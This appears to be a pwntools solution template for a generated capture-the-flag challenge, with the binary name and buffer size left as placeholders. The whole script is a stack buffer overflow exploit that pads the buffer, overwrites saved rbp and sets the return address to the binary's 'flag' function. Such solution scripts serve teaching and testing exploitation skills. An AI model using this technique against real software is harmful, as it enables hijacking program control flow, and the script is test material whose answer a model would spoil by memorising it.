from pwn import *

gen_filename = ""
gen_templates = {}

e = ELF(gen_filename)
p = e.process()
p.readline()

dest = e.symbols['flag']

B = gen_templates["B"]

payload = b''
payload += B * b'a'   # buffer
payload += 8 * b'b'   # rbp
payload += p64(dest)  # rip
p.sendline(payload)

print(p.readlineS())

